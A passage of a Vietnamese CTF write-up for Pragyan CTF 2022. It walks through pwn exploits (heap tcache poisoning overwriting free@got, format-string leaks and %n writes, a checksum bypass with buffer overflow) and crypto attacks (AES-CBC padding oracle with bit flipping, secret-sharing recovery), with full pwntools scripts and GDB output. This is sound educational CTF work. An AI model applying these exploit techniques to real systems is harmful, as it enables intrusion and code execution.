Chức năng thứ ba là `update_item` sẽ yêu cầu ta nhập độ dài mới cho chunk mà không giải phóng chunk cũ và cũng không malloc chunk mới -> **Heap Overflow** khi nhập độ dài lớn hơn ban đầu.

Chức năng cuối cùng là `delete_item` sẽ free() chunk, sau đó loại bỏ kích thước cũng như con trỏ trỏ tới chunk trong `database`. Vì thế ta sẽ không có lỗi use after free ở đây.

Đó là tất cả những gì ta có thể tìm thấy. Hãy chuyển sang phần tiếp theo: Ý tưởng!
#### Cách 1

Với giải pháp đầu tiên, trước tiên ta tạo một chunk lớn và giải phóng nó, chunk này sẽ được chuyển đến unsorted bin và chứa địa chỉ main arena của libc. Kế đến, ta sẽ sử dụng `show_items` để lấy địa chỉ đó và tính toán địa chỉ base của libc.

Sau đó, ta tạo 2 chunk nhỏ và free() hết cả 2 chunk đó. Và rồi ta sẽ lợi dụng tính link list của tcache bằng cách ghi đè forward pointer thành địa chỉ của `__free_hook`. Sau đó ta malloc lại 2 chunk với cùng kích thước. Với malloc thứ hai, tức là ta đã có thể viết vào `__free_hook`, ta sẽ viết địa chỉ của system và khi ta free() một chuỗi chứa chunk `/bin/sh` sẽ thực thi system("/bin/sh").

#### Cách 2

Với cách này, mình vừa viết wu vừa suy nghĩ về cách khai thác. Đầu tiên ta sẽ tạo 2 chunk nhỏ và free() cả 2 chunk này, sau đó lợi dụng tính link list của tcache bằng cách ghi đè forward pointer thành địa chỉ của free@got.

Tiếp theo, ta malloc 2 chunk với cùng kích thước và với malloc thứ hai, tức là ta đã kiểm soát free@got, ta chỉ cần viết địa chỉ của hàm secret() vào và khi thực thi hàm free(), ta sẽ lấy được cờ.

- Tóm lược:
  1. Tấn công tcache
Trước khi bắt đầu, mình đã viết các hàm này để thuận tiện trong việc khai thác:

<details>
<summary>Đoạn mã</summary>
<p>

```
def insert(length, data):
    p.sendlineafter(b'choice => ', b'2')
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string you want to save => ', data)

def update(index, length, data):
    p.sendlineafter(b'choice => ', b'3')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string => ', data)

def remove(index):
    p.sendlineafter(b'choice => ', b'4')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())

def show():
    p.sendlineafter(b'choice => ', b'1')
```

</p>
</details>

Và chúng ta bắt đầu!

#### Tấn công tcache

Đầu tiên, ta sẽ malloc 4 chunk nhỏ:

```
insert(0x10, b'0'*0x10)    # Control the chunk below
insert(0x10, b'1'*0x10)    # Remove second
insert(0x10, b'2'*0x10)    # Remove first
insert(0x10, b'3'*0x10)    # Avoid heap consolidation
```

Sau đó, chỉ cần free chunk index 2 và 1:

```
remove(2)
remove(1)
```

Kiểm tra trong GDB và ta có thể thấy rằng 2 chunk nhỏ này đã đi vào tcache:

![image](https://user-images.githubusercontent.com/30711980/157140956-867cabaa-6891-416e-8042-e3d5855c43cf.png)

Hãy xem 2 chunk này trông như thế nào:

```
gef➤  x/20xg 0x000055dc28dcf250
0x55dc28dcf250:    0x0000000000000000    0x0000000000000021    <-- Chunk index 0
0x55dc28dcf260:    0x3030303030303030    0x3030303030303030
0x55dc28dcf270:    0x0000000000000000    0x0000000000000021    <-- Chunk index 1
0x55dc28dcf280:    0x000055dc28dcf2a0    0x000055dc28dcf010
0x55dc28dcf290:    0x0000000000000000    0x0000000000000021    <-- Chunk index 2
0x55dc28dcf2a0:    0x0000000000000000    0x000055dc28dcf010
0x55dc28dcf2b0:    0x0000000000000000    0x0000000000000021    <-- Chunk index 3
0x55dc28dcf2c0:    0x3333333333333333    0x3333333333333333
0x55dc28dcf2d0:    0x0000000000000000    0x0000000000020d31
0x55dc28dcf2e0:    0x0000000000000000    0x0000000000000000
```

Chúng ta có thể thấy được forward pointer được đặt trong chunk index 1. Ta chỉ cần thực thi hàm `update_item` với chunk 0 và thay đổi kich thước lớn hơn. Từ đó ta có thể ghi đè forward pointer thành địa chỉ của free@got:

```
payload = b'0'*0x10
payload += p64(0)
payload += p64(0x21)
payload += p64(exe.got['free'])
update(0, 0x50, payload)
```

Sau đó ta chỉ malloc 2 đoạn với cùng kích thước 0x10:

```
insert(0x10, b'1'*0x10)
insert(0x10, b'2'*0x10)
```

Thực thi script và ta kiểm tra `database` để lấy địa chỉ chunk mới (Do mình chạy lại nên địa chỉ đã thay đổi):

```
gef➤  x/10xg &data_base
0x56132f201d80 <data_base>:       0x0000000000000050    0x00005613303dd260
0x56132f201d90 <data_base+16>:    0x0000000000000010    0x00005613303dd280
0x56132f201da0 <data_base+32>:    0x0000000000000010    0x000056132f201cc8
0x56132f201db0 <data_base+48>:    0x0000000000000010    0x00005613303dd2c0
0x56132f201dc0 <data_base+64>:    0x0000000000000000    0x0000000000000000

gef➤  x/xg 0x000056132f201cc8
0x56132f201cc8 <free@got.plt>:	0x3232323232323232
```

Ta thấy rằng địa chỉ chunk mới vẫn được giữ nguyên như trước ngoại trừ địa chỉ của chunk 2 đã thay đổi thành `0x000056132f201cc8`, đó là địa chỉ của free@got. Vì vậy, đối với insert() thứ hai của đoạn code trên, ta sẽ ghi đè dữ liệu của free@got thành địa chỉ của secret(). Code bên trên sẽ được thay đổi như sau:

```
insert(0x10, b'1'*0x10)
insert(0x10, p64(exe.sym['secret']))
```

Sau khi ta thay đổi thành công free@got, chỉ cần chạy free() và ta sẽ lấy được cờ:

```
remove(0)
```

Full code 1: [solve_1.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/database/solve_1.py)  
Full code 2: [solve_2.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/database/solve_2.py)  
![image](https://user-images.githubusercontent.com/30711980/157140985-2fc9f001-c323-4fe9-8f76-69c78ba13eed.png)

`Flag: p_ctf{Ch4Ng3_1T_t0_M4x1Mum}`

> ### Portal 
Bạn cũng có thể tải xuống challenge ở đây: [load.zip](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/Portal/load.zip)
Trước tiên, ta sẽ sử dụng `file` để kiểm tra thông tin cơ bản:

```
$ file load
load: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1128f7b9cbf10c5208e4624339366761018789ca, for GNU/Linux 3.2.0, not stripped
```

Đây là tệp 64-bit không bị ẩn code. Tiếp theo, ta sẽ sử dụng `checksec` để kiểm tra tất cả các lớp bảo vệ của file:

```
$ checksec load
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Wow, tất cả các lớp đều được bật. Cuối cùng, ta sẽ dịch ngược file bằng ghidra để hiểu được cách chương trình hoạt động.

Hàm main() không có gì thú vị. Nó chỉ nhận đầu vào và sau đó so sánh để thực hiện các hàm tương ứng.

Trong hàm see_balance(), chúng ta có thể thấy rằng có một lỗi **Format string** tại printf():

![image](https://user-images.githubusercontent.com/30711980/157139646-9691cb33-3f47-48e9-b0f1-b45749bfd062.png)

Tại hàm init_pack(), nó kiểm tra xem biến toàn cục `b` có bằng 249 hay không. Nếu nó bằng nhau thì hãy nhảy vào hàm lift_pack(), và có vẻ như nó đọc một file được gọi là `flag_maybe` và sau đó lưu nó vào stack.

Mình vừa tìm đến đó đã lấy được cờ nên phần còn lại bỏ qua =)))
Với lỗi **Format string**, ta có thể thay đổi dữ liệu của biến toàn cầu `b` thành 249 và khi đó, cờ sẽ được đọc và lưu trữ trên ngăn xếp. Ta sẽ sử dụng lại lỗi này để leak cờ ra ngoài.

Để thay đổi `b`, chúng ta cần địa chỉ base của binary vì `PIE enabled`. Sau đó, mọi thứ sẽ trở nên dễ dàng hơn.

- Tóm lược:
  1. Leak địa chỉ base
  2. Thay đổi `b`
  3. Lấy cờ

Đầu tiên, ta sẽ kiểm tra xem tại `%p` thứ mấy sẽ in ra vị trí đầu của dữ liệu được nhập:
```
p.sendlineafter(b'2) Upgrade Pack', b'1')
payload = b'AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p'
p.sendlineafter(b'Wanna upgrade pack?', payload)
p.recvline()
```

Chạy script và ta biết vị trí bắt đầu của chuỗi được nhập nằm ở `%6$p`:

![image](https://user-images.githubusercontent.com/30711980/157139674-1af32853-2490-4596-aaf8-07a1b23a4bee.png)

Ta sẽ kiểm tra stack ngay tại lệnh prinft có lỗi **Format String** đó để kiếm giá trị bất kỳ thuộc range địa chỉ của binary:

```
gef➤  x/20xg $rsp
0x7ffe2e91e320:	0x3931257024383125	0x0a70243532257024
0x7ffe2e91e330:	0x0000560cb2743000	0x00007f53692944a0
0x7ffe2e91e340:	0x0000000000000000	0x00007f536913b013
0x7ffe2e91e350:	0x000000000000000f	0x00007f53692936a0
0x7ffe2e91e360:	0x0000560cb274117f	0x00007f5369292980
0x7ffe2e91e370:	0x00007f53692944a0	0x00007f536912c546
0x7ffe2e91e380:	0x0000560cb27407e0	0x289158d542ab4f00
0x7ffe2e91e390:	0x00007ffe2e91e3b0	0x0000560cb2740766
0x7ffe2e91e3a0:	0x000000012e91e4a0	0x289158d542ab4f00
0x7ffe2e91e3b0:	0x0000000000000000	0x00007f53690ce0b3

gef➤  x/xw 0x0000560cb27407e0
0x560cb27407e0 <__libc_csu_init>:	0xfa1e0ff3
```

Chúng ta có thể thấy rằng tại địa chỉ `0x7ffe2e91e380` của stack có chứa địa chỉ của `__libc_csu_init`, vì vậy ta sẽ leak địa chỉ đó và tính toán để lấy địa chỉ base của binary.

Offset của địa chỉ `__libc_csu_init` sẽ nằm ở vị trí `%18$p` (`6 + 12 = 18`). Payload sẽ thay đổi thành:

```
p.sendlineafter(b'2) Upgrade Pack', b'1')
payload = b'%18$p'
p.sendlineafter(b'Wanna upgrade pack?', payload)
p.recvline()

# Get address of __libc_csu_init
__libc_csu_init_addr = int(p.recvline()[:-1].split(b'0x')[1], 16)
log.success("__libc_csu_init: " + hex(__libc_csu_init_addr))

# Calculate binary base address
exe.address = __libc_csu_init_addr - exe.sym['__libc_csu_init']
log.success("Exe base: " + hex(exe.address))
```

Chạy script và ta leak địa chỉ của địa `__libc_csu_init` thành công. Sau đó thực hiện tính toán và ta có địa chỉ base của binary:

![image](https://user-images.githubusercontent.com/30711980/157139700-b96a66bb-dc94-4be5-af17-c4681f30b582.png)

Bây giờ chúng ta sẽ chuyển sang giai đoạn tiếp theo: Thay đổi `b`!
Với địa chỉ base của binary, ta có thể lấy được địa chỉ của `b` một cách dễ dàng. Như ta đã biết, offset của phần đầu dữ liệu nhập vào nằm ở `%6$p` và vì đây là tệp 64 bit nên ta cần đặt địa chỉ ở cuối (nếu đặt địa chỉ `b` ở đầu với null byte trong địa chỉ thì printf() sẽ dừng thực thi tại null byte và giá trị `b` sẽ không thay đổi).

Ta kiểm tra xem nếu chúng ta nhập đầy đủ 100 byte vào see_balance() thì stack trông như thế nào:

```
p.sendlineafter(b'2) Upgrade Pack', b'1')
payload = cyclic(100)
p.sendlineafter(b'Wanna upgrade pack?', payload)
p.recvline()
```

Chạy script và ta kiểm tra stack:

```
gef➤  x/20xg $rsp
0x7ffda58eb950:	0x6161616261616161	0x6161616461616163
0x7ffda58eb960:	0x6161616661616165	0x6161616861616167
0x7ffda58eb970:	0x6161616a61616169	0x6161616c6161616b
0x7ffda58eb980:	0x6161616e6161616d	0x616161706161616f
0x7ffda58eb990:	0x6161617261616171	0x6161617461616173
0x7ffda58eb9a0:	0x6161617661616175	0x6161617861616177
0x7ffda58eb9b0:	0x0000563a00616179	0xd5397c62369cd900
0x7ffda58eb9c0:	0x00007ffda58eb9e0	0x0000563aaaabf766
0x7ffda58eb9d0:	0x00000001a58ebad0	0xd5397c62369cd900
0x7ffda58eb9e0:	0x0000000000000000	0x00007fdd4554d0b3
```

Vậy, ta sẽ muốn đặt địa chỉ của `b` ở cuối dữ liệu nhập vào tại địa chỉ `0x7ffda58eb9a0 + 0x8`. Chỉ bằng cách đếm, ta biết được offset là `6 + 11 = 17`.

Có điều ta cần phải lưu ý, ta không nên sử dụng `%<k>$n` để viết giá trị. Do đó, ta sẽ sử dụng biểu mẫu chuẩn là `%n. Ví dụ đoạn mã sau sẽ giống như `%17$p`:

```
# Each '%' will count 1
payload = b'%c'*15
payload += b'%c%p'
```

Vì vậy, trước tiên ta sẽ đặt địa chỉ của `b` vào cuối dữ liệu đầu vào:

```
payload = b'%c'*15
payload += b'%c%p'               # We will use this to change b
payload = payload.ljust(0x58)    # Padding
payload += p64(exe.sym['b'])
```

Và ta sẽ muốn ghi 249 byte `b` bằng cách thay đổi số byte đưa vào ở dòng thứ 2 của payload bên trên. Payload mới sẽ trông như thế này:

```
payload = b'%c'*15
payload += '%{}c%n'.format(249 - 15).encode()    # We will use this to change b
payload = payload.ljust(0x58)                    # Padding
payload += p64(exe.sym['b'])
```

Tại sao mình lại viết `249 - 15`, đó là bởi vì `%n` sẽ viết số lượng byte trước `%n` vào vị trí của `b` (sử dụng `%p` sẽ cung cấp cho chúng ta địa chỉ chính xác của `b` và sử dụng `%n` sẽ ghi số byte trước nó vào `b`).

Payload cho giai đoạn 2 như sau:

```
p.sendlineafter(b'2) Upgrade Pack', b'1')

payload = b'%c'*15
payload += '%{}c%n'.format(249-15).encode()    # We will use this to change b
payload = payload.ljust(0x58, b'P')             # Padding
payload += p64(exe.sym['b'])
p.sendlineafter(b'Wanna upgrade pack?', payload)
```

Chạy script và kiểm tra trong GDB, ta có thể thấy giá trị `b` đã được thay đổi thành 249:

![image](https://user-images.githubusercontent.com/30711980/157140572-3ddee734-b228-452b-9772-673cef05d29a.png)

Vậy giờ ta sẽ chuyển sang giai đoạn cuối cùng: Lấy cờ!
Sau khi chúng tôi đã thành công giai đoạn 2, ta chỉ việc chọn tùy chọn thứ hai `Upgrade Pack` để đọc và đưa cờ lên stack. Ta sẽ tạo cờ giả để kiểm tra:

```
0x00007ffebbd18650│+0x0000: 0x0000555c0a0092a0  →  0x00000000fbad2488	 ← $rsp
0x00007ffebbd18658│+0x0008: 0x00007ffebbd18714  →  0x6675aa0000000002
0x00007ffebbd18660│+0x0010: "This_Is_Fake_FlagXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"	 ← $rax, $r8
0x00007ffebbd18668│+0x0018: "Fake_FlagXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"
0x00007ffebbd18670│+0x0020: "gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"
0x00007ffebbd18678│+0x0028: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"
0x00007ffebbd18680│+0x0030: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"
0x00007ffebbd18688│+0x0038: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]"
```

Ta có thể thấy rằng cờ được viết trên stack rất gần với rsp. Vì vậy, ta chỉ cần sử dụng **Format string** ở tùy chọn 1 để leak cờ:

```
p.sendlineafter(b'2) Upgrade Pack', b'2')
payload = b'%p'*20
p.sendlineafter(b'Enter coupon code:', payload)
```

Mình đã thử với `%s` nhưng không thành công nên sử dụng `%p` thay thế. Chạy script và ta có thể lấy được cờ giả:

![image](https://user-images.githubusercontent.com/30711980/157140672-a82ceaa7-9540-451f-9e58-0cdd942e2969.png)

Vậy ta chỉ cần chạy trên máy chủ và nhận được cờ dưới dạng hex, sau đó khôi phục nó và ta lấy được cờ.

Full code: [solve.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/Portal/solve.py)    
![image](https://user-images.githubusercontent.com/30711980/157140756-bc8d79f2-708e-40b4-8812-68ba3f30201d.png)

Mình đã viết đoạn mã này để chuyển đổi cờ ở định dạng hex thành văn bản như dưới đây:

<details>
<summary>Convert.py</summary>
<p>

```
#!/usr/bin/python

while True:
	hx = input('> ')
	if '0x' in hx:
		hx = hx.replace('0x', '')
	tx = ''
	for i in range(0, len(hx), 2):
		tx += chr(int(hx[i:i+2], 16))
	print(tx[::-1])
```

</p>
</details>

![image](https://user-images.githubusercontent.com/30711980/157140687-c0b11312-57bf-456b-9269-a7c46dc6c06b.png)

`Flag: p_ctf{W3ll_1t_W4s_3aSy_0n1y}`

> ### PolyFlow
Bạn cũng có thể tải challenge ở đây: [Poly-flow.zip](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/PolyFlow/Poly-flow.zip)
Trước tiên, ta sẽ sử dụng `file` để kiểm tra thông tin cơ bản:
```
$ file Poly-flow
Poly-flow: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=681641744fb6d6d68665b3a0a2a1ebac46415b0e, for GNU/Linux 3.2.0, not stripped
```
Đây là tệp 32-bit không bị ẩn code. Tiếp theo, ta dùng `checksec` để kiểm tra security của file:
```
$ checksec Poly-flow
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Chúng ta có thể thấy rằng `Canary found` và `NX enabled`. Cuối cùng, ta mở ghidra và dịch ngược file để hiểu cách hoạt động của chương trình.
Hàm main sẽ yêu cầu nhập dữ liệu, sau đó kiểm tra và nếu đúng thì chúng ta sẽ thực thi hàm input():
![image](https://user-images.githubusercontent.com/30711980/157139320-a31d1032-1103-4e2d-b108-497e0de5204d.png)

Tại hàm check(), nó sẽ cộng lần lượt 4 byte trong 16 byte đầu tiên của chuỗi nhập vào và so sánh kết quả với `0xdeadbeef`

![image](https://user-images.githubusercontent.com/30711980/157139367-4217509b-a93a-4c9a-9c1f-b2180ce62b7e.png)

Vòng lặp sum bên trong sẽ hoạt động như thế này(định dạng hex) trên ngăn xếp nếu chúng ta nhập `aaaabaaacaaadaaa`:

```
 a a a a           61 61 61 61
 a a a b    -->    61 61 61 62
 a a a c           61 61 61 63
 a a a d           61 61 61 64
-------------------------------
                   85 85 85 8a
```
Vì tổng sẽ cho kết quả là `0x1xx` nên `0x61*4 = 0x184 + 1 = 0x185`. Và sau khi tính tổng, nếu nó bằng `0xdeadbeef` chúng ta sẽ đi vào hàm input():

![image](https://user-images.githubusercontent.com/30711980/157139402-73b69eaf-20c8-402d-8bb5-0b3056d4b8c2.png)

Biến `i.0` là một biến toàn cục và khi bắt đầu chương trình, giá trị của nó là 0. Chúng ta có thể nhận thấy rằng biến cục bộ local_1c chỉ được định nghĩa 20 byte nhưng chúng ta có thể nhập tối đa 36 byte -> **Buffer Overflow** .

Đó là tất cả những gì chúng ta có thể tìm thấy. Hãy chuyển sang phần tiếp theo: Ý tưởng!
Tất nhiên, điều đầu tiên chúng ta cần làm là đảm bảo rằng chúng ta có thể truy cập vào hàm input(). Để làm được điều đó, chúng ta cần phải vượt qua hàm check().

Sau đó, chúng ta sẽ dùng bug **Buffer Overflow** để thực thi hàm nhập 5 lần để biến `i.0` tăng dần lên và có giá trị là 5, khi đó cờ sẽ được in ra.

- Tóm lược: 
  1. Vượt qua hàm check()
  2. Lấy cờ
Như chúng ta biết rằng trong hàm check(), nó sẽ cộng lần lượt 4 byte trong số 16 byte đầu tiên và sau đó so sánh với `0xdeadbeef`. Vì vậy, ta sẽ chia 16 byte thành 4 byte mỗi dòng như trên.

Đầu tiên, ta sẽ không muốn sau khi tính tổng, kết quả mỗi byte là 0x1xx vì điều đó sẽ khiến ta nhầm lẫn. Do đó ta sẽ lấy từng byte `0xdeadbeef` và chia cho 4 để có giá trị thích hợp cho mỗi byte đầu vào (mã Python):

```
0xde / 4        = 55.5
(0xde - 2) / 4  = 55.0 = 0x37

0xad / 4        = 43.25
(0xad - 1) / 4  = 43.0 = 0x2b

0xbe / 4        = 47.5
(0xbe - 2) / 4  = 47.0 = 0x2f

0xef / 4        = 59.75
(0xef - 3) / 4  = 59.0 = 0x3b
```

Vì vậy, ngăn xếp sẽ tính tổng 4 byte như thế này (định dạng hex):

```
37 2b 2f 3b
37 2b 2f 3b
37 2b 2f 3b
39 2c 31 3e
-----------
de ad be ef
```

Nhưng chờ đã, vì ngăn xếp có thứ tự ngược lại nên ta sẽ cần phải thay đổi tất cả các cột như sau:

```
3b 2f 2b 37
3b 2f 2b 37
3b 2f 2b 37
3e 31 2c 39
-----------
ef be ad de
```

Và đó là payload cho scanf ():

```
payload1 = \x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3e\x31\x2c\x39
```

Ta dùng pwntool để nhập dữ liệu và chúng ta nhảy vào hàm input().

```
payload1 = b'\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3e\x31\x2c\x39'
p.sendlineafter(b'passphrase: ', payload1)
```

Và bây giờ, chúng ta hãy chuyển sang giai đoạn cuối: Lấy cờ!
Chúng ta có thể thấy rằng sau khi scanf() nhập 16 byte, thì byte `\n` vẫn còn và sẽ đi vào fgets(). Đó là lý do tại sao khi chúng ta nhập đủ 16 byte thì chương trình sẽ dừng lại. Vì vậy, ta sẽ thêm giá trị vào payload để truyền vào fgets() thông qua `payload1` bên trên.

Như bên trên, ta có lỗi **Buffer Overflow** nên hãy tìm offset tới eip với cyclic() trước tiên. Sau một lúc thử và debug thì ta biết rằng offset bằng 28, và sau 28 byte là return eip.

Chúng ta cũng có thể thấy rằng biến toàn cục `i.0` sẽ được tăng lên 1 khi thực thi hàm input(). Vì vậy, ta sẽ muốn ghi đè saved eip bằng hàm input() để tăng biến toàn cục `i.0` dần dần cho tới 5, và sau đó ta sẽ lấy được cờ.

```
# scanf()
payload1 = b'\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3e\x31\x2c\x39'

# fgets
payload1 += b'A'*(28)             # Padding
payload1 += p32(0x08049860)       # input function
p.sendlineafter(b'passphrase: ', payload1)

for i in range(4):
    p.sendline(payload1[16:])     # The same with padding and input() function
```

Full script: [solve.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/PolyFlow/solve.py)  
![image](https://user-images.githubusercontent.com/30711980/157139447-8b742258-f315-4cc4-93b9-f61b0700b702.png)

`Flag: p_ctf{mUlT1Pl3_BuFf3R_Ov3rF|0w}`

## Crypto
> ### Kinda AESthetic
Đề bài cung cấp file `Kinda_AESthetic.py`
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os, sys
import string
import random

KEY = os.urandom(16)
IV = os.urandom(16)
flag = REDACTED

def encrypt(msg):
    msg = pad(msg, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted = cipher.encrypt(msg)
    encrypted = encrypted.hex()
    msg = IV.hex() + encrypted
    return msg

def decrypt(msg, iv):
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(msg), 16).decode()
    return decrypted

def parse(inp):
    iv = bytes.fromhex(inp[:32])
    msg = bytes.fromhex(inp[32:])
    msg = decrypt(msg,iv)
    return msg

chars = string.printable[:-5]
x = random.randint(5, 15)
passwd = ''.join(random.choice(chars) for _ in range(x))

secrets = {
    'abrac': 'iloveyou',
    'sudo': REDACTED, # ;)
    'gg': passwd,
    'yeager': 'ironman'
}

x = random.randint(5, 13)
token = ''.join(random.choice(chars) for _ in range(x))

def lookup(inp):
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, inp[:16])
        inp = unpad(cipher.decrypt(inp[16:]), 16)
    except:
        return 'idek'
    try:
        name = inp.decode()
        assert name[:len(token)] == token
        name = name[len(token):]
        return secrets[name]
    except:
        return 'idk'

print('Here is an encrypted token for you:')
print(encrypt(token.encode()))

while True:
    try:
        inp = input()
        try:
            user = parse(inp)
            assert user == 'gg'
            print('Welcome gg! Enter your secret passphrase:')
            inp = input()
            password = parse(inp)
            if password == secrets['gg']:
                print(flag)
                sys.exit(0)
            else:
                print(r'p_ctf{potato}')
        except:
            inp = bytes.fromhex(inp)
            print(lookup(inp))
    except:
        print('')
        sys.exit(0)
```
Chúng ta có thể thấy được challenge này liên quan đến `CBC Bit Flipping và Padding Oracle Attack`
Tham khảo thêm: https://ichi.pro/vi/huong-dan-hackthebox-flippin-bank-gioi-thieu-ve-cuoc-tan-cong-lat-bit-cbc-231420708308392


```py
from hashlib import new
from pwn import remote, xor
from Crypto.Util.Padding import pad, unpad

# idek -> wrong padding
# idk -> correct padding
# gg
# lookup token||gg

r = remote("crypto.challs.pragyanctf.tech", 5001)
r.recvline()
token = bytes.fromhex(r.recvline().strip().decode())
iv,ct = token[:16], token[16:]

decrypted = [0]*16
for i in range(1,17):
    new_iv = decrypted.copy()
    for j in range(i):
        new_iv[-j] = new_iv[-j] ^ i
    for j in range(256):
        print(j)
        new_iv[-i] = j
        r.sendline((bytes(new_iv)+ct).hex().encode())
        if b'idk' in r.recvline():
            decrypted[-i] = j ^ i
            print(decrypted)
            break

token = unpad(xor(iv,bytes(decrypted)),16)
print("Token:",token)
new_iv = xor(pad(token+b"gg",16),bytes(decrypted))
r.sendline((new_iv+ct).hex().encode())
pw = r.recvline().strip()
print("passwd:",pw)

new_iv = xor(pad(b"gg",16),bytes(decrypted))
r.sendline((new_iv+ct).hex().encode())
print(r.recvline())
new_iv = xor(pad(pw,16),bytes(decrypted))
r.sendline((new_iv+ct).hex().encode())
print(r.recvline())
```

Sau khi chạy chương trình ta thu được flag
![image](https://user-images.githubusercontent.com/86729493/157032219-d03cfc50-f011-4aa6-9340-2d723ca226ed.png)
`Flag: p_ctf{4_l1ttl3_p4d4tt4ck_h3r3_&4_l1ttl3_x0r_THERE}`

> ### Fragmented Heist

Challenge source:
```python
from secret import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
from zlib import crc32
P = 93327214260434303138080906179883696131283277062733597039773430143631378719403851851296505697016458801222349445773245718371527858795457860775687842513513120173676986599209741174960099561600915819416543039173509037555167973076303047419790245327596338909743308199889740594091849756693219926218111062780849456373


def hashAF(x):
    res = []
    final = b""
    bytesAF = long_to_bytes(x)
    a = bytesAF[:len(bytesAF) % 8]
    res.append(a)
    res.append(long_to_bytes(crc32(a)))
    t = (len(bytesAF) // 8)
    bytesAF = bytesAF[len(bytesAF) % 8:]
    for i in range(t):
        a = bytesAF[i*8:(i+1)*8]
        res.append(a)
        res.append(long_to_bytes(crc32(a)))
    for i in res:
        final += i
    res = bytes_to_long(final)
    return (res + (res >> 600)) & 2**(600)-1


def evaluate(a, x, P=P):
    return (a[0]+a[1]*x+a[2]*x ** 2+a[3]*x ** 3) % P


def SSSS(secret):
    pt = bytes_to_long(secret.encode())
    a = []
    fragments = []
    a.append(hashAF(pt))
    for i in range(3):
        a.append(hashAF(a[i]))
    for i in range(4):
        fragments.append([a[i], evaluate(a, a[i])])
    return fragments


pt = bytes_to_long(flag.encode())
frag = SSSS(flag)
print(frag[1])
#[2720495220767623469285353744013822381852003568708186036185616503729980637299872397663528775139327535373882372413441024067687853130042950311733094495718491989102461186253653660920574, 15843669386575231305658351759203181197336939290074172277291278488719033553337092007099376279196087414169431058207783322243407822366880172512356717418627958539974211317395928935201076097698103133753750610845316760255658006438109555979823148869170489527876600496043886788103609669557918594073292264548123406903]
```

Đề cho một function hashAF(Integer) -> Integer, quan sát quá trình hàm thực thi chúng ta có thể thấy được biến `final` vẫn giữ lại giá trị (ở dạng byte) của đầu vào `x`, chỉ khác là final được thêm các CRC tạo ra từ `x`. Sau đó hashAF return kết quả `res = bytes_to_long(final); return (res + (res >> 600)) & 2**(600)-1`. Lưu ý là nếu res < 2^600 thì (res >> 600) = 0 nên từ kết quả trả về sẽ tìm lại được đầu vào. Từ đề bài có thể thấy ý của tác giả nói về điểm lưu ý này.

Ví dụ:
```python
>>> x = bytes_to_long(b'abcdefghijklmnop')
>>> long_to_bytes(hashAF(x))
b"abcdefgh\xae\xef*Pijklmnop\x82\xd4\xdd'"
```

Như vậy cần phải tìm lại a[0] vì `a[0] = hashAF(flag)`.

Dữ liệu đề cho là `frag[1]`, nghĩa là có được a[1] và evaluate(a, a[1]). Với `(evaluate(a,x) -> (a[0] + a[1]*x + a[2]*x**2 + a[3]*x**3) % P)`.

Từ a[1] có thể tìm lại được a[2], a[3] do `a[i+1] = hashAF(a[i])` -> Tìm lại a[0] bằng cách tính `a[0] = [frag[1][1] - (a[1]*x + a[2]*x**2 + a[3]*x**3)] % P` với x = frag[1][0].

```python
>>> f = [2720495220767623469285353744013822381852003568708186036185616503729980637299872397663528775139327535373882372413441024067687853130042950311733094495718491989102461186253653660920574, 15843669386575231305658351759203181197336939290074172277291278488719033553337092007099376279196087414169431058207783322243407822366880172512356717418627958539974211317395928935201076097698103133753750610845316760255658006438109555979823148869170489527876600496043886788103609669557918594073292264548123406903]
>>> a1 = f[0]
>>> a2 = hashAF(a1)
>>> a3 = hashAF(a2)
>>> x = f[0]
>>> a0 = (f[1] - (a1*x + a2*x**2 + a3*x**3)) % P
>>> long_to_bytes(a0)
b'p_ct4#\x9bLf{y4u_s7b\xeb\x06\xd25c3ssf7L\xf4p.{Ly_pull3\r^\xe0\x89d_0ff_th\x87\x81\xf9\xfc3_h3ist}\xcc\xa5\x82;'
```

`Flag: p_ctf{y4u_s75c3ssf7LLy_pull3d_0ff_th3_h3ist}`

> ### There Is No ECC

Challenge source:
```python
from secret import *
from random import randint
from math import gcd
from Crypto.Util.number import *


class EllipticCurve:
    def __init__(self, a, b, p) -> None:
        self.a = a
        self.b = b
